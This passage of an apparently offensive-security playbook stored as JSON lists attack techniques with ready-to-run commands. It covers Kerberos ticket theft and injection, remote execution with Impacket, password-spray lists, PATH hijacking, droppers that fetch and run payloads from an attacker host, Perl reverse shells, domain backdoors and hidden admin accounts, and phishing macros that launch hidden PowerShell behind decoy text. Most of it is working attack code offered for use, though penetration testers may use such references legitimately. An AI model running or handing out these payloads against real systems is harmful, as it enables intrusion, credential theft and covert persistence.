            "lang": "powershell",
            "code": ".\\mimikatz.exe \"kerberos::ptt <ticket.kirbi>\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Inject Ticket with Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe ptt /ticket:<base64_ticket>"
          },
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe ptt /ticket:<ticket.kirbi>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Convert Ticket Formats",
        "codes": [
          {
            "lang": "bash",
            "code": "# .kirbi (Windows) to .ccache (Linux)\nimpacket-ticketConverter ticket.kirbi ticket.ccache"
          },
          {
            "lang": "bash",
            "code": "# .ccache to .kirbi\nimpacket-ticketConverter ticket.ccache ticket.kirbi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Use Ticket from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "export KRB5CCNAME=ticket.ccache\nimpacket-psexec -k -no-pass <Domain>/<Username>@<TargetFQDN>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Verify Injected Tickets",
        "codes": [
          {
            "lang": "powershell",
            "code": "klist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Clear Tickets",
        "codes": [
          {
            "lang": "powershell",
            "code": "klist purge"
          },
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"kerberos::purge\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Pass-the-Ticket",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use stolen Kerberos tickets to authenticate as another user. No password or hash needed - just the ticket.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Pass-the-Ticket",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Ticket Sources",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Mimikatz** - `.kirbi` format via `sekurlsa::tickets /export`\n**Rubeus** - `.kirbi` format via `Rubeus.exe dump`\n**Impacket** - `.ccache` format via `getTGT.py`, `getST.py`\n**Linux tools** - `.ccache` format (most Python tooling)"
          }
        ]
      },
      {
        "title": "When to Use Ticket Auth",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**NTLM disabled** - Only Kerberos allowed on target\n**Stolen ticket** - Got ticket from memory, no hash needed\n**Golden/Silver Ticket** - Forged ticket for persistence\n**Avoiding detection** - Can be stealthier than PTH"
          }
        ]
      },
      {
        "title": "Convert Ticket Formats",
        "codes": [
          {
            "lang": "bash",
            "code": "ticketConverter.py ticket.kirbi ticket.ccache\nticketConverter.py ticket.ccache ticket.kirbi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Load Ticket - Linux",
        "codes": [
          {
            "lang": "bash",
            "code": "export KRB5CCNAME=/full/path/to/ticket.ccache\nklist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Pass-the-Ticket - Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": "kerberos::ptt /ticket:C:\\path\\to\\ticket.kirbi\ndir \\\\<DC>\\C$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Pass-the-Ticket - Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": "Rubeus.exe ptt /ticket:C:\\path\\to\\ticket.kirbi\nRubeus.exe ptt /ticket:<Base64Ticket>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Verify Ticket Loaded (Windows)",
        "codes": [
          {
            "lang": "powershell",
            "code": "klist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Use Native Tools (Windows)",
        "codes": [
          {
            "lang": "powershell",
            "code": "dir \\\\<Hostname>\\C$\nPsExec.exe \\\\<Hostname> cmd.exe\nEnter-PSSession -ComputerName <Hostname>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Impacket Execution with Ticket",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec <Domain>/<User>@<TargetIP> -k -no-pass\nimpacket-psexec -k -no-pass <TargetFQDN>\nimpacket-smbexec -k -no-pass <TargetFQDN>\nimpacket-wmiexec -k -no-pass <TargetFQDN>\nimpacket-secretsdump <Domain>/<User>@<DC_IP> -k -no-pass"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMB File Access with Ticket",
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient -k //<TargetFQDN>/C$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use stolen or forged Kerberos tickets to authenticate without password or hash.\n**Requirements:** Valid TGT or TGS ticket, DNS resolution working (Kerberos uses hostnames), time sync within 5 minutes of DC."
      }
    ]
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Pass-the-Ticket",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [
      {
        "text": "HackTricks Pass-the-Ticket",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use stolen Kerberos tickets to authenticate as another user. No password or hash needed - just the ticket.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Passive Information Gathering",
    "title": "Passive Information Gathering",
    "tags": [
      "Discovery",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "Whois Enumeration",
        "substeps": [
          {
            "title": "Forward Lookup",
            "codes": [
              {
                "lang": "bash",
                "code": "whois <Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Reverse Lookup (IP to Owner)",
            "codes": [
              {
                "lang": "bash",
                "code": "whois <IPAddress>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Query domain registration info including:\n- Registrant name and organization\n- Address and phone\n- Nameservers"
          }
        ]
      },
      {
        "title": "Shodan",
        "substeps": [
          {
            "title": "Search by Hostname",
            "codes": [
              {
                "lang": "bash",
                "code": "hostname:<Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Filter by Port",
            "codes": [
              {
                "lang": "bash",
                "code": "hostname:<Domain> port:22"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Filter by Product",
            "codes": [
              {
                "lang": "bash",
                "code": "hostname:<Domain> product:Apache"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Search by Organization",
            "codes": [
              {
                "lang": "bash",
                "code": "org:\"<OrganizationName>\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Vulnerable Systems",
            "codes": [
              {
                "lang": "bash",
                "code": "hostname:<Domain> vuln:CVE-2021-44228"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Shodan CLI",
            "codes": [
              {
                "lang": "bash",
                "code": "shodan search hostname:<Domain>"
              },
              {
                "lang": "bash",
                "code": "shodan host <IPAddress>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search engine for internet-connected devices. Reveals IPs, services, banners, versions, and vulnerabilities.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Google Dorking",
        "substeps": [
          {
            "title": "Find Subdomains",
            "codes": [
              {
                "lang": "bash",
                "code": "site:<Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Specific File Types",
            "codes": [
              {
                "lang": "bash",
                "code": "site:<Domain> filetype:pdf"
              },
              {
                "lang": "bash",
                "code": "site:<Domain> ext:php"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Directory Listings",
            "codes": [
              {
                "lang": "bash",
                "code": "intitle:\"index of\" \"parent directory\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Login Pages",
            "codes": [
              {
                "lang": "bash",
                "code": "site:<Domain> inurl:admin"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Configuration Files",
            "codes": [
              {
                "lang": "bash",
                "code": "site:<Domain> ext:env | ext:yaml | ext:json | ext:xml | ext:conf | ext:ini | ext:log"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Sensitive Information",
            "codes": [
              {
                "lang": "bash",
                "code": "site:<Domain> \"password\" filetype:txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use search operators to find sensitive information indexed by Google:\n- **site:** - Limits to domain\n- **filetype/ext:** - Limits to file type\n- **intitle:** - Searches page titles\n- **inurl:** - Searches URLs",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Technology Fingerprinting - Wappalyzer",
        "codes": [
          {
            "lang": "bash",
            "code": "https://www.wappalyzer.com/lookup/<Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Security Headers Analysis",
        "codes": [
          {
            "lang": "bash",
            "code": "https://securityheaders.com/?q=<URL>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check for missing security headers:\n- **Content-Security-Policy**\n- **X-Frame-Options**\n- **Strict-Transport-Security**"
          }
        ]
      },
      {
        "title": "SSL/TLS Analysis",
        "substeps": [
          {
            "title": "testssl.sh",
            "codes": [
              {
                "lang": "bash",
                "code": "testssl.sh <Domain>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "https://www.ssllabs.com/ssltest/analyze.html?d=<Domain>"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Check SSL/TLS configuration for vulnerabilities like **POODLE**, **Heartbleed**, and weak ciphers."
          }
        ]
      },
      {
        "title": "GitHub Search",
        "substeps": [
          {
            "title": "Find Files by Name",
            "codes": [
              {
                "lang": "bash",
                "code": "org:<OrgName> path:users"
              },
              {
                "lang": "bash",
                "code": "org:<OrgName> path:password"
              },
              {
                "lang": "bash",
                "code": "org:<OrgName> path:config"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Secrets in Code",
            "codes": [
              {
                "lang": "bash",
                "code": "org:<OrgName> password"
              },
              {
                "lang": "bash",
                "code": "org:<OrgName> api_key"
              },
              {
                "lang": "bash",
                "code": "org:<OrgName> secret"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search within an org with **org:**, search filenames with **path:**, search file content with keywords.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Automated Secret Scanning",
        "substeps": [
          {
            "title": "Gitleaks",
            "codes": [
              {
                "lang": "bash",
                "code": "gitleaks detect --source <RepoPath> -v"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "TruffleHog",
            "codes": [
              {
                "lang": "bash",
                "code": "trufflehog git <RepoURL>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Pentesting Methodology",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Query domain registration, infrastructure, and internet-connected devices without touching target directly.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Password Attacks",
    "title": "Password Attack Strategy",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Common Default Passwords",
        "codes": [
          {
            "lang": "text",
            "code": "password\npassword1\nPassword1\nPassword@123\nadmin\nadmin123\nadministrator\nWelcome1\n123456\n12345678"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Try these first before running large wordlists."
          }
        ]
      },
      {
        "title": "Common Spray Passwords",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Seasonal and company-based patterns:\n- **Season+Year:** Summer2024!, Winter2024!, Spring2024!, Fall2024!\n- **Month+Year:** January2024!, December2024!\n- **Company+123:** CompanyName123!, CompanyName1!\n- **Password variants:** Password1!, P@ssw0rd!, Qwerty123!\n- **Default/Lazy:** Welcome1!, Changeme1!",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Brute Force",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/brute-force.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**Attack order:** Try username as password, service name as creds (e.g., `tomcat:tomcat`), common defaults, then wordlists.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Password Cracking",
    "title": "Password Cracking Methodology",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [],
    "resources": [
      {
        "text": "Hashcat",
        "url": "https://hashcat.net/hashcat/"
      },
      {
        "text": "John the Ripper",
        "url": "http://www.openwall.com/john/"
      },
      {
        "text": "Weakpass Wordlists",
        "url": "https://weakpass.com/wordlist"
      },
      {
        "text": "HashKiller",
        "url": "https://hashkiller.io/listmanager"
      },
      {
        "text": "CrackStation",
        "url": "https://crackstation.net/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Comprehensive methodology for cracking password hashes using Hashcat and John the Ripper."
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "Password Patterns",
    "tags": [],
    "steps": [
      {
        "title": "Year-Based Passwords",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Password2024\nWelcome2024\nCompany2024\nAdmin2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Season-Based Passwords",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Spring2024\nSummer2024\nFall2024\nWinter2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Month-Based Passwords",
        "codes": [
          {
            "lang": "plaintext",
            "code": "January2024\nFebruary2024\nMarch2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Company Name Patterns",
        "codes": [
          {
            "lang": "plaintext",
            "code": "<CompanyName>123\n<CompanyName>2024\n<CompanyName>!\n<CompanyName>@123"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Password Strategy",
    "title": "Password Patterns",
    "tags": [],
    "steps": [
      {
        "title": "Year-Based Passwords",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Password2024\nWelcome2024\nCompany2024\nAdmin2024\nSpring2024\nSummer2024\nFall2024\nWinter2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Month-Based Passwords",
        "codes": [
          {
            "lang": "plaintext",
            "code": "January2024\nFebruary2024\nMarch2024\nApril2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Company-Based Passwords",
        "codes": [
          {
            "lang": "plaintext",
            "code": "<CompanyName>123\n<CompanyName>2024\n<CompanyName>!\n<CompanyName>@123\n<CompanyName>@2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Patterns",
        "codes": [
          {
            "lang": "plaintext",
            "code": "# Capital + lowercase + numbers + special\nPassword123!\nWelcome123!\nAdmin123!\n\n# Season + Year\nSummer2024\nWinter2024\n\n# Month + Year\nJanuary2024"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Password Spraying",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Password Spraying - SMB",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec smb <TargetIPRange> -u users.txt -p '<Password>' --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Password Spraying - Kerberos",
        "codes": [
          {
            "lang": "bash",
            "code": "kerbrute passwordspray -d <Domain> --dc <DC_IP> users.txt '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password to NTLM Hash (Python)",
    "title": "Password to NTLM Hash (Python)",
    "tags": [
      "Credential_Access",
      "NTLM",
      "Password_Attack",
      "Python"
    ],
    "steps": [
      {
        "title": "Create the Script",
        "codes": [
          {
            "lang": "python",
            "code": "#!/usr/bin/env python3\n\"\"\"Convert a cleartext password to an NTLM hash.\"\"\"\n\nimport sys\nfrom passlib.hash import nthash\n\ndef password_to_ntlm(password: str) -> str:\n    \"\"\"\n    Convert a cleartext password to its NTLM hash.\n    \n    NTLM hash is the MD4 hash of the password encoded in UTF-16LE (little-endian).\n    \"\"\"\n    return nthash.hash(password).upper()\n\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        password = sys.argv[1]\n    else:\n        password = input(\"Enter password: \")\n    \n    ntlm_hash = password_to_ntlm(password)\n    print(f\"Password: {password}\")\n    print(f\"NTLM Hash: {ntlm_hash}\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Converts a cleartext password to its NTLM hash using **passlib**. NTLM hash is the MD4 hash of the password encoded in UTF-16LE.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "PATH Hijacking",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Check PATH",
        "codes": [
          {
            "lang": "bash",
            "code": "echo $PATH"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Writable PATH Directories",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -writable 2>/dev/null | grep -E \"^/usr/local/sbin|^/usr/local/bin|^/usr/sbin|^/usr/bin|^/sbin|^/bin\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Malicious Binary",
        "codes": [
          {
            "lang": "bash",
            "code": "# If /tmp is in PATH before /usr/bin\necho '/bin/bash' > /tmp/ls\nchmod +x /tmp/ls"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Droppers and HTML Smuggling",
    "title": "Payload Staging Concepts",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "Initial_Access",
      "Windows"
    ],
    "steps": [
      {
        "title": "Staged vs Non-Staged Payloads",
        "substeps": [
          {
            "title": "Non-Staged Payload",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f exe -o shell.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Complete payload in single file. Larger size, simpler execution. Single network transaction.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "Staged Payload",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f exe -o stager.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Small initial stager downloads full payload. Smaller initial size, requires callback. Two-stage execution.",
                "variant": "info"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Building Droppers",
        "substeps": [
          {
            "title": "PowerShell Download Cradle",
            "codes": [
              {
                "lang": "powershell",
                "code": "IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerShell Download and Execute",
            "codes": [
              {
                "lang": "powershell",
                "code": "$url = \"http://<AttackerIP>/payload.exe\"\n$out = \"$env:TEMP\\payload.exe\"\n(New-Object Net.WebClient).DownloadFile($url, $out)\nStart-Process $out"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Certutil Dropper",
            "codes": [
              {
                "lang": "bash",
                "code": "certutil -urlcache -split -f http://<AttackerIP>/payload.exe %TEMP%\\payload.exe && %TEMP%\\payload.exe"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Bitsadmin Dropper",
            "codes": [
              {
                "lang": "bash",
                "code": "bitsadmin /transfer job /download /priority high http://<AttackerIP>/payload.exe %TEMP%\\payload.exe && %TEMP%\\payload.exe"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Phishing Files",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/phishing-documents.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Droppers deliver payloads to target systems. Choice between staged and non-staged affects detection and reliability.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "Perl Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Linux Perl",
        "codes": [
          {
            "lang": "bash",
            "code": "perl -e 'use Socket;$i=\"<AttackerIP>\";$p=<Port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Perl Without /bin/sh",
        "codes": [
          {
            "lang": "bash",
            "code": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"<AttackerIP>:<Port>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Perl for Windows",
        "codes": [
          {
            "lang": "bash",
            "code": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"<AttackerIP>:<Port>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Persistence",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Add Domain User",
        "codes": [
          {
            "lang": "bash",
            "code": "net user <NewUsername> <Password> /add /domain\nnet group \"Domain Admins\" <Username> /add /domain\nnet group \"<GroupName>\" <Username> /add /domain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires Domain Admin privileges."
          }
        ]
      },
      {
        "title": "Skeleton Key",
        "codes": [
          {
            "lang": "bash",
            "code": "misc::skeleton"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Inject into LSASS on DC. All users can auth with password \"mimikatz\"."
          }
        ]
      },
      {
        "title": "DSRM Persistence",
        "codes": [
          {
            "lang": "bash",
            "code": "ntdsutil \"set dsrm password\" \"reset password on server null\" q q\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Just-In-Time (JIT) Access",
    "title": "Persistence Through JIT",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Create Backdoor Shadow Principal",
        "codes": [
          {
            "lang": "powershell",
            "code": "# In PAM forest with admin rights\nNew-ADUser -Name \"BackdoorShadow\" -SamAccountName \"backdoor\" -Server <PAMForest>\nAdd-ADGroupMember -Identity \"Shadow Admins\" -Members \"backdoor\" -Server <PAMForest>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Modify TTL Settings",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Extend membership duration\nSet-ADGroup \"Shadow Admins\" -Replace @{'msDS-MembershipTTL'='999999'} -Server <PAMForest>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "User Management Commands",
    "title": "Persistence via User Accounts",
    "tags": [],
    "steps": [
      {
        "title": "Windows Hidden User",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create user\nnet user backdoor$ Password123! /add\n\n# Add to administrators\nnet localgroup Administrators backdoor$ /add\n\n# Hide from login screen (requires registry edit)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v backdoor$ /t REG_DWORD /d 0 /f"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux Hidden User",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create user with no home directory\nsudo useradd -M -s /bin/bash backdoor\n\n# Set password\nsudo passwd backdoor\n\n# Add to sudo group\nsudo usermod -aG sudo backdoor\n\n# Hide from login screen (optional)\nsudo usermod -s /usr/sbin/nologin backdoor"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "VBA Fundamentals",
    "title": "Phishing Pretexting",
    "tags": [
      "Code_Injection",
      "Execution",
      "Windows"
    ],
    "steps": [
      {
        "title": "Document Switching Technique",
        "codes": [
          {
            "lang": "vba",
            "code": "Sub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    ' Execute payload\n    Dim wsh As Object\n    Set wsh = CreateObject(\"WScript.Shell\")\n    wsh.Run \"powershell -exec bypass -nop -w hidden -enc <Payload>\", 0, False\n\n    ' Switch document content\n    ActiveDocument.Content.Delete\n    ActiveDocument.Content.InsertAfter \"Thank you for your patience. The document failed to load. Please contact support.\"\nEnd Sub"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Display decoy content after macro executes to maintain cover.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Template Injection Pretext",
        "codes": [
          {
            "lang": "vba",
            "code": "Sub AutoOpen()\n    ' Hide \"Enable Content\" prompt by showing legitimate-looking content\n    ActiveDocument.Shapes(\"DecoyImage\").Visible = False\n    ActiveDocument.Shapes(\"RealContent\").Visible = True\n\n    ' Execute payload in background\n    MyMacro\nEnd Sub"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create document that looks like it needs macros enabled for legitimate reason.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Social engineering context increases macro execution likelihood.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "PHP Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "PHP System Call",
        "codes": [
          {
            "lang": "php",
